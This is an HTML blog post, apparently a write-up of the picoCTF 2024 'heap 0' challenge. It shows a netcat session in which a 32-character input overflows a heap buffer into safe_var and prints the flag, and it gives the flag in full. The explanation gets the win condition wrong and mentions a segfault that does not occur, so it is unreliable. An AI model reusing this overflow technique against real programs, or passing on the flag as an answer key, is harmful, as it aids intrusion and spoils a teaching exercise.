
<!DOCTYPE html>
<html>

<body>
    <h1>heap 0- picoctf 2024</h1>

    <h2>Challenge Description</h2>
    <p> AUTHOR: ABRXS, PR1OR1TYQ

Description
Are overflows just a stack concern?
Download the binary <a href="https://phantom1ss.github.io/blog/2024/pico2024/heap0/chall">here</a>.
Download the source <a href="https://phantom1ss.github.io/blog/2024/pico2024/heap0/chall.c">here</a>.
Additional details will be available after launching your challenge instance.
-----------------------------------------------
nc tethys.picoctf.net 51562
</p>
 
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
    we open source and see that in condition 4 check win
<p id="code1">
  case 4:
            // Check for win condition
            check_win();
            break;
</p>
 and if safe_var is equal "bico" it print flag.all option print table and safevar and add input to safe_var.
<pre>
//c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

</pre>
<pre>
 so if have inputs in more than heap size(intthis case) can cause segment fault and get flag
  ┌──(kali㉿kali)-[~/…/blog/2024/pico2024/heap0]
└─$ nc tethys.picoctf.net 51562


Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5b31783ba2b0  ->   pico
+-------------+----------------+
[*]   0x5b31783ba2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49}
  </pre>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{my_first_heap_overflow_4fa6dd49}

</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for work  on heap overflow</p>
</body>
</html>


